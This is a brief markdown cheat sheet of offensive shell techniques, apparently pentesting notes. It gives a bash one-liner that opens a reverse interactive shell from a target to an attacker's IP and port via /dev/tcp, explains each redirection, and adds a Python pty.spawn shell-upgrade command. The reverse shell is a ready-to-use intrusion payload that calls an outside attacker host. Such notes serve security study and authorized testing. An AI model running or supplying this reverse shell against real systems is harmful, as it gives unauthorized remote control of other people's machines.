# Bash

## Bash One-Liner Reverse Shell

Bash one-liner to create a reverse interactive shell from the target to your attack machine: 
- Enter the  following in the target: 

```
/bin/bash -c 'bash -i &> /dev/tcp/[attack ip]/[port] 0>&1'
```

From the Bash manpage: 
- `c string` : commands are read from string.
- `>& (same as &>)` : redirect standard output (1) and standard error (2); i.e., 2>&1 
  - This means: `&>` redirects the standard output (fd 1) and error (fd 2) to the socket opened to the IP 192.166.95.2 which would be listening on port 1234 (the port you indicate in [port] ).
- `0>&1` : redirect standard input (fd 0) to the same place as standard output (fd 1).
  - This would literally mean '0' (standard input) is attached to '1' (standard output).
  - Therefore, stdin (fd 0) is attached to stdout (fd 1) and (from the above:  &> ) we know that the stdin for this bash process is available to the attacker listening on port 1234.

---

## Bash Shell via Python

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
